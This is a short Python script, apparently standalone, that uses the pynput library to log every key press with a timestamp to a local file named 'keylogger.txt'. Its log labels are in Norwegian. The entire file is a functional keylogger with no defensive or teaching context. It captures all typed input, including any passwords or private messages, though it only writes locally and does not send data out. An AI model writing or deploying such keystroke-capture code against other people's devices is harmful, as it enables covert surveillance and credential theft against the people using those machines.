from pynput import keyboard
import logging

log_file = "keylogger.txt"

logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

def is_pressed(key):
    try:
        logging.info(f"Tast: {key.char}")
    except AttributeError:
        logging.info(f"Spesialtast: {key}")

with keyboard.Listener(on_press=is_pressed) as listener:
    listener.join()